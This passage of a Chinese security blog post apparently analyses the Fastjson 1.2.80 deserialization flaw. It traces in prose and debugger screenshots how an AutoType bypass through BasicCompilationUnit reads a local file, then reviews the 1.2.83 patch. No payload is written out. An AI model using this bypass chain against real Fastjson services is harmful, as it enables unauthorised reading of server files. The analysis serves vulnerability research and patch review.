+<p>调用<code>ObjectArrayCode.deserialize()</code>，获取到<code>interface org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit</code>，带入<code>parseArray()</code>；<br>跟进到<code>getDeserializer()</code>将<code>ICompilationUnit</code>接口类型的<code>deserializer</code> put 进<code>this.deserializer</code>，这里就和前面两条链的目的一样，为后续绕过 AutoType 做准备；<br><img src="/./images/1664171051944.png" alt="enter description here"></p>
+<p>然后逐步返回，到结束反序列化时，抛出了一个异常，由于构造的 json 字符串闭合不正确；<br><img src="/./images/1664172387020.png" alt="enter description here"></p>
+<p>接着就进入到 catch 分支，对第三个 json 数据进行反序列化。<br><img src="/./images/1664172604335.png" alt="enter description here"></p>
+<p>获取到第一个<code>@type</code>，带入<code>checkAutoType()</code>，从<code>this.deserializer</code>中找到并返回<code>ICompilationUnit</code>类；<br><img src="/./images/1664172810004.png" alt="enter description here"></p>
+<p>接着调用<code>deserialize()</code>，获取到第二个<code>@type</code>的值，带入<code>checkAutoType()</code>，第二个参数不为 null；<br><img src="/./images/1664173058206.png" alt="enter description here"></p>
+<p>加载并返回<code>BasicCompilationUnit</code>，然后调用<code>deserialize()</code>；<br><img src="/./images/1664173137074.png" alt="enter description here"></p>
+<p>跟进，在<code>deserialize()</code>中把<code>BasicCompilationUnit</code>类型中不为 null 的参数放到<code>params</code>中，然后实例化该类；<br><img src="/./images/1664173725651.png" alt="enter description here"></p>
+<p>最后返回<code>JSONObject</code>对象，到这里还没读到文件中的内容；<br><img src="/./images/1664175078300.png" alt="enter description here"></p>
+<p>继续跟进<code>println()</code>，到<code>MapSerializer.write()</code>，再继续跟进，看不到调试过程了；<br><img src="/./images/1664175621997.png" alt="enter description here"></p>
+<p>但是一直点，会跳到<code>BasicCompilationUnit.getContents()</code>，这里将<code>D:/1.txt</code>转换为 File 对象，调用了<code>Util.getFileCharContent()</code>；<br><img src="/./images/1664175712954.png" alt="enter description here"></p>
+<p>在<code>getFileCharContent()</code>中创建输入流，以字符数组的形式读取文件中的内容；<br><img src="/./images/1664176248482.png" alt="enter description here"></p>
+<p>然后就是返回、输出文件内容。<br><img src="/./images/1664176464924.png" alt="enter description here"></p>
+<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>更新到 1.2.83 版本。<br><code>checkAutoType()</code>中，在从<code>mapping</code>获取到 <code>java.lang.Execption</code>后，添加了一个校验；<br>如果满足<code>expectClass</code>为 null 、<code>clazz</code>不为 null 、<code>clazz</code>实现或继承<code>Throwable.class</code>、未开启 AutoTpye，那把 <code>clazz</code>赋为 null；<br><img src="/./images/1663839700773.png" alt="enter description here"></p>
+<p>最后只能返回一个 null。<br><img src="/./images/1663839842821.png" alt="enter description here"></p>
+<p>参考连接：<br><a target="_blank" rel="noopener" href="https://y4er.com/">https://y4er.com/</a></p>
+
+      </div>
+    </div>
+</div>
+
+
+<div class="post-footer">
+  
+  <div class="donate text-center">
+    <span>喜欢这篇文章？为什么不考虑打赏一下作者呢？</span>
+    <div class="donate-way">
+      
+    </div>
+  </div>
+  
+
+  <div class="post-copyright">
+    <p style="margin: 5px 0;">文章作者：<a href="/">John Doe</a></p>
+    <p style="margin: 5px 0;">文章链接：<a href="http://example.com/2022/09/26/Fastjson%201.2.80%20%E5%88%86%E6%9E%90/">http://example.com/2022/09/26/Fastjson%201.2.80%20%E5%88%86%E6%9E%90/</a></p>
+    <p style="margin: 5px 0;">版权声明：本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处，谢谢。</p>
+  </div>
+  
+</div>
+
+    <!-- Comments -->
+    <div class="comments">
+        
+        
+    </div>
+
+</article>
+
+
+        </div>
+        
+<footer class="text-center">
+    
+    
+    
+    
+    
+    <p>&copy;  2020 - 2021&nbsp;&nbsp;Theme Miracle</p>
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme by <a href="https://github.com/hifun-team/hexo-theme-miracle" target="_blank">Miracle</a></p>
+    
+    
+</footer>
+
+<div class="p-btn">
+    
+        <a class="toc-btn" id="toc-btn"><i id="i-menu"></i></a>
+    
+    <a href="#top" class="click-btn">
+      <i id="i-up"></i>
+    </a>
+</div>
+
+<!-- SCRIPTS -->
+
+
+
+
+
+
+
+<script>
+    document.getElementById("btn-dropdown").addEventListener('click', () => {
+      toggleClass("#dropdown-menus","display-inline");
+    });
+    console.log('\n' + ' %c Powered by Hexo Theme Miracle ' + ' %c https://github.com/hifun-team/hexo-theme-miracle ' + '\n' + '\n', 'color: #fff; background: #4F9BFA; padding:5px 0;', 'background: #FFF; padding:5px 0;');
+
+    
+
+    
+      document.addEventListener('copy', function (event) {
+      const clipboardData = event.clipboardData || window.clipboardData;
+      if (!clipboardData) { return; }
+      const text = window.getSelection().toString();
+      if (text) {
+        event.preventDefault();
+        clipboardData.setData('text/plain', text + '本文章由 blckder02 撰写，转载请注明来源喔。');
+      }
+    });
+    
+  /* 小彩蛋: 饮茶先啦 */
+  setTimeout(() => {
+    var time = new Date();
+    if (time.getHours() == 15) {
+      let comment = document.createComment(' 三点几嚟！饮茶先啦！ ');
+      document.body.insertBefore(comment, document.getElementsByTagName('header')[0]);
+    }
+  },1);
+    
+</script>
+
+
+<script>
+    var postImg = document.querySelectorAll("article[class=page] img");
+    for (let imgi = 0; imgi < postImg.length; imgi++) {
+        postImg[imgi].onclick = () => {
+            let zoomImg = document.createElement("div");
+            zoomImg.id = "zoomImg";
+            zoomImg.innerHTML = `<div id="zoom-picture"></div>
+    <div class="poptrox-overlay"
+        style="position: fixed; left: 0px; top: 0px; z-index: 20000; width: 100%; height: 100%; text-align: center; cursor: zoom-out; opacity: 1;">
+        <div style="display:inline-block;height:100%;vertical-align:middle;"></div>
+        <div
+            style="position:absolute;left:0;top:0;width:100%;height:100%;background:#000000;opacity:0;filter:alpha(opacity=0);">
+        </div>
+        <div class="poptrox-popup"
+            style="display: inline-block; vertical-align: middle; position: relative; z-index: 1; cursor: zoom-out; min-width: 10px; min-height: 10px; width: auto; height: auto;">
+            <div class="loader" style="display: none;"></div>
+            <div class="pic" style="text-indent: 0px;"><img
+                    src="${ postImg[imgi].srcset || postImg[imgi].src }" alt="Loading..."
+                    style="vertical-align: bottom; max-width: 85vw; max-height: 85vh;"></div>
+        </div>
+    </div>`;
+            document.body.appendChild(zoomImg);
+                document.querySelector("#zoomImg").onclick = () => {
+                    document.querySelector("#zoomImg").remove();
+                }
+        }
+    }
+    
+</script>
+
+
+
+
+    <script>
+        query("#toc-btn")[0].onclick = () => {
+            if (query(".post-toc")[0].innerHTML) {
+                toggleClass(".post-toc", "display-inline");
+            }
+        }
+
+        if (!query(".post-toc")[0].innerHTML) {
+            addClass("#toc-btn","display-none");
+        }
+    </script>
+
+
+
+
+
+
+
+
+
+        </div>
+        <div id="css-loading">
+            <h3 class="text-center">加载中...</h3>
+        </div>
+        
+    </body>
+</html>
